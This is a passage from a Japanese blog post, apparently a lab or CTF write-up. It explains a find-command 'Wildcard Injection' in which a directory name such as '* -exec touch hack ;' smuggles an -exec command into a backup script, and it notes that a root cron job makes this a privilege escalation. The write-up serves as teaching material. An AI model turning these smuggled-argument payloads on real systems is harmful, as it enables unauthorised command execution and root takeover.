&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; dir in &lt;span class=&#34;nv&#34;&gt;$image_dirs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;isProductDir&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;find &lt;span class=&#34;nv&#34;&gt;$dir&lt;/span&gt; -maxdepth &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -name &lt;span class=&#34;s1&#34;&gt;&amp;#39;goods_img&amp;#39;&lt;/span&gt; -type d  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;wc -l&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$isProductDir&lt;/span&gt; -eq &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                bakDir &lt;span class=&#34;nv&#34;&gt;$dir&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure&gt;&lt;img src=&#34;./bak_find.png&#34;/&gt;
&lt;/figure&gt;

&lt;p&gt;本スクリプトでは find が2箇所登場しています。&lt;/p&gt;
&lt;p&gt;まずは2つ目の find の対象パスに注目します。&lt;/p&gt;
&lt;p&gt;「find $dir 」とありますが、$dir とは $image_dirs 配列の要素です。&lt;br&gt;
そして $image_dirs は 「find $ecshop_dir/images 」の結果です。&lt;br&gt;
さらに、最初のfind の検索条件は 「&amp;quot;*&amp;quot;」 と書いてあるとおり、任意のものをマッチさせます。&lt;br&gt;
（-type dなのでディレクトリが検索条件）&lt;/p&gt;
&lt;p&gt;任意のディレクトリの名前をそのままfindに渡しているということですね。&lt;br&gt;
つまり⚠️危険⚠️な名前のディレクトリを作成すれば、findはその名前で色々やってくれるということです。&lt;/p&gt;
&lt;p&gt;この仕様を利用した攻撃を &lt;strong&gt;Wildcard Injection&lt;/strong&gt; といいます。&lt;/p&gt;
&lt;p&gt;しかも今回、/var/www/html/images は公開ディレクトリでした。&lt;br&gt;
このディレクトリはwww-dataユーザに書き込み権限があるので、自由にディレクトリを作成することができます。(ここが一番キモ)&lt;/p&gt;
&lt;br/&gt;
&lt;h2 id=&#34;find-コマンドの-おさらい&#34;&gt;find コマンドの おさらい&lt;/h2&gt;
&lt;p&gt;攻撃の前に、find コマンドのおさらいをします。&lt;br&gt;
&lt;br/&gt;
find コマンドには、-exec という便利なオプションがあります。&lt;br&gt;
まずは実験のため、自分の環境で/tmp/images/ ディレクトリを作成します。&lt;br&gt;
そしてその配下に 201903, 201904, 201905 ディレクトリを作成します。&lt;br&gt;
（面白いのでぜひみんなも試してくれよな）
&lt;br/&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ mkdir /tmp/images/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /tmp/images
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ mkdir &lt;span class=&#34;m&#34;&gt;201903&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;201904&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;201905&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ ls
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;201903&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;201904&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;201905&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;br/&gt;
find はご存知の通り、ファイルやディレクトリを検索するコマンドです。  
-exec オプションは、検索にマッチしたパスに対して、パスごとにOSコマンドを適用できます。
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shu@kali:/tmp/images$ find *
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;201903&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;201904&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;201905&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shu@kali:/tmp/images$ find * -exec &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Path:{}&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Path:201903
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Path:201904
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Path:201905
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;※{}はマッチしたものが入る変数です。&lt;br&gt;
※「;」は-execの終了を示す記号です。&lt;br&gt;
本当は「;」ですが、「;」はシェルでコマンドの区切りを示す特殊文字なのでエスケープしています。&lt;/p&gt;
&lt;p&gt;上記ではechoを使いましたが、別にどんなOSコマンドでも問題ないです。&lt;br&gt;
{}を使う必要もなし。以下みたいに。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shu@kali:/tmp/images$ find * -exec uname &lt;span class=&#34;se&#34;&gt;\;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Linux
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Linux
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Linux
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;unameを使ってみました。3つのディレクトリが存在するので3回unameされてます。&lt;/p&gt;
&lt;p&gt;当然touch コマンドとかもいいです。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shu@kali:/tmp/images$ find * -exec touch Test &lt;span class=&#34;se&#34;&gt;\;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shu@kali:/tmp/images$ ls -l
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;total &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;drwxr-xr-x &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; shu shu &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;13&lt;/span&gt; 07:15 &lt;span class=&#34;m&#34;&gt;201903&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;drwxr-xr-x &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; shu shu &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;13&lt;/span&gt; 07:15 &lt;span class=&#34;m&#34;&gt;201904&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;drwxr-xr-x &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; shu shu &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;13&lt;/span&gt; 07:15 &lt;span class=&#34;m&#34;&gt;201905&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; shu shu    &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;13&lt;/span&gt; 07:25 Test
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;findコマンドの仕組み上ディレクトリの数だけ同じコマンドが実行されるので、冪等性が保たれるようにしましょう。&lt;br&gt;
(状態をスイッチするコマンドとかは冪等性が保たれないのでここで使うのはよくない🙅)&lt;/p&gt;
&lt;p&gt;なお、findコマンドを実行したユーザの権限でOSコマンドが実行されます。&lt;/p&gt;
&lt;br/&gt;
## WildCard Injection の原理
&lt;p&gt;次はこの-execの仕組みを利用して攻撃を試行します。&lt;/p&gt;
&lt;h3 id=&#34;実験環境の作成&#34;&gt;実験環境の作成&lt;/h3&gt;
&lt;p&gt;実験用にbakProductImage.shのfind部分を再現したシェルを作成し、vuln.shとして保存します。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;image_dirs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; find /tmp/images -mindepth &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -maxdepth &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -name &lt;span class=&#34;s2&#34;&gt;&amp;#34;*&amp;#34;&lt;/span&gt; -type d&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; dir in &lt;span class=&#34;nv&#34;&gt;$image_dirs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;find &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$dir&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; -maxdepth 1 -name &amp;#39;goods_img&amp;#39; -type d &amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	     find &lt;span class=&#34;nv&#34;&gt;$dir&lt;/span&gt; -maxdepth &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -name &lt;span class=&#34;s1&#34;&gt;&amp;#39;goods_img&amp;#39;&lt;/span&gt; -type d 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;===&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;br/&gt;
試しに実行してみます。
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shu@kali:/tmp/images$ bash vuln.sh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;find /tmp/images/201904 -maxdepth &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -name &lt;span class=&#34;s1&#34;&gt;&amp;#39;goods_img&amp;#39;&lt;/span&gt; -type &lt;span class=&#34;nv&#34;&gt;d&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;find /tmp/images/201905 -maxdepth &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -name &lt;span class=&#34;s1&#34;&gt;&amp;#39;goods_img&amp;#39;&lt;/span&gt; -type &lt;span class=&#34;nv&#34;&gt;d&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;find /tmp/images/201903 -maxdepth &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -name &lt;span class=&#34;s1&#34;&gt;&amp;#39;goods_img&amp;#39;&lt;/span&gt; -type &lt;span class=&#34;nv&#34;&gt;d&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;/tmp/imagesにあるディレクトリ3つに対してさらにfindが実行されました。&lt;br&gt;
echoだけがあって2つめのfindの結果が表示されないのは、各ディレクトリに&amp;quot;goods_img&amp;quot;が存在せず検索にマッチしなかったからです。&lt;/p&gt;
&lt;p&gt;試しに201903のディレクトリにgoods_imgディレクトリを作成します。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shu@kali:/tmp/images$ mkdir 201903/goods_img
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;br/&gt;
再度実行してみます。
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shu@kali:/tmp/images$ bash vuln.sh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;find /tmp/images/201904 -maxdepth &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -name &lt;span class=&#34;s1&#34;&gt;&amp;#39;goods_img&amp;#39;&lt;/span&gt; -type &lt;span class=&#34;nv&#34;&gt;d&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;find /tmp/images/201905 -maxdepth &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -name &lt;span class=&#34;s1&#34;&gt;&amp;#39;goods_img&amp;#39;&lt;/span&gt; -type &lt;span class=&#34;nv&#34;&gt;d&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;find /tmp/images/201903 -maxdepth &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -name &lt;span class=&#34;s1&#34;&gt;&amp;#39;goods_img&amp;#39;&lt;/span&gt; -type d
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/tmp/images/201903/goods_img
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;201903ディレクトリだけ2つ目のfindでマッチ結果が実行されていますね。&lt;/p&gt;
&lt;br/&gt;
### ⚠️危険⚠️なディレクトリを作成する
&lt;p&gt;ディレクトリ名が $dir の形で 2つめのfindに渡されているということは、&lt;br&gt;
⚠️危険⚠️な名前のディレクトリを作成すれば任意のコマンドが実行できるということです。&lt;/p&gt;
&lt;p&gt;以下のようにディレクトリ名とは思えないディレクトリを作成します。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shu@kali:/tmp/images$ mkdir &lt;span class=&#34;s2&#34;&gt;&amp;#34;* -exec touch hack ;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shu@kali:/tmp/images$ ls -l
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;total &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;drwxr-xr-x &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; shu shu &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;13&lt;/span&gt; 07:48  &lt;span class=&#34;m&#34;&gt;201903&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;drwxr-xr-x &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; shu shu &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;13&lt;/span&gt; 07:50  &lt;span class=&#34;m&#34;&gt;201904&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;drwxr-xr-x &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; shu shu &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;13&lt;/span&gt; 07:50  &lt;span class=&#34;m&#34;&gt;201905&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;drwxr-xr-x &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; shu shu &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;13&lt;/span&gt; 08:04 &lt;span class=&#34;s1&#34;&gt;&amp;#39;* -exec touch hack ;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; shu shu  &lt;span class=&#34;m&#34;&gt;245&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;13&lt;/span&gt; 07:45  vuln.sh
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;「* -exec touch hack ;」という名前のディレクトリを作成しました。&lt;br&gt;
先程のfindの結果のとおりパスがマッチしないと-execが実行されないので最初に「*」を、&lt;br&gt;
また -exec の終端を示すため末尾に「;」を付与しています。&lt;/p&gt;
&lt;p&gt;さて、この状態でもう一度vuln.shを実行します。&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;./find_test_injection.png&#34;/&gt;
&lt;/figure&gt;

&lt;p&gt;エラーが大量に出ていますね。大量のエラーはインジェクション系攻撃の宿命です。&lt;/p&gt;
&lt;p&gt;危険なディレクトリを使ったfindはどうなっているでしょうか。下に抜粋します。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;find /tmp/images/* -exec touch hack &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; -maxdepth &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -name &lt;span class=&#34;s1&#34;&gt;&amp;#39;goods_img&amp;#39;&lt;/span&gt; -type d
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;/tmp/images/* で引っかかったものに対して touch hack を行うという内容になっています。&lt;/p&gt;
&lt;p&gt;ディレクトリの状態を見ます。&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;./find_test_injection_ls.png&#34;/&gt;
&lt;/figure&gt;

&lt;p&gt;hackファイルが作成されていますね。実験環境でWildcard Injectionが成功しました💪&lt;/p&gt;
&lt;p&gt;これをcronがroot権限でやってくれると権限昇格が捗りますね。　←ここ一番キモ&lt;/p&gt;
&lt;br/&gt;
&lt;h3 id=&#34;-exec-の使い勝手を良くする&#34;&gt;-exec の使い勝手を良くする&lt;/h3&gt;
&lt;p&gt;前項でWildcard Injectionは成功しましたが、これだけでは侵害には使いにくいです。&lt;br&gt;
これは以下の理由によるものです。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;-exec は単一コマンドしか使えない&lt;/li&gt;
&lt;li&gt;ディレクトリ名には「/」が使えないので、ファイル操作が困難&lt;br&gt;
パスが通ってないディレクトリの自作スクリプトを指定することもできません。&lt;/li&gt;
&lt;li&gt;引数にスペースを含められない&lt;br&gt;
これはforとfindの問題だと思いますが・・・。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ただ、単一コマンドしか使えない場合でも、例えば bashなら bash -c を使ってワンライナーで複数コマンドを書くことができます。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shu@kali:/tmp/images$ bash -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;echo aaa; echo bbb&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;aaa
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bbb
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;しかしながら、今回のfor内のfindではスペースが使えません。&lt;br&gt;
実際に試してみます。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shu@kali:/tmp/images$ mkdir &lt;span class=&#34;s2&#34;&gt;&amp;#34;* -exec bash -c \&amp;#34;touch aaa\&amp;#34; ;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shu@kali:/tmp/images$ bash vuln.sh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;snip&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;find /tmp/images/* -exec bash -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;touch aaa&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; -maxdepth &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -name &lt;span class=&#34;s1&#34;&gt;&amp;#39;goods_img&amp;#39;&lt;/span&gt; -type d
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;snip&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;aaa&lt;span class=&#34;s2&#34;&gt;&amp;#34;: -c: line 0: unexpected EOF while looking for matching `&amp;#34;&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;aaa&amp;#34;: -c: line 1: syntax error: unexpected end of file
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;(snip)
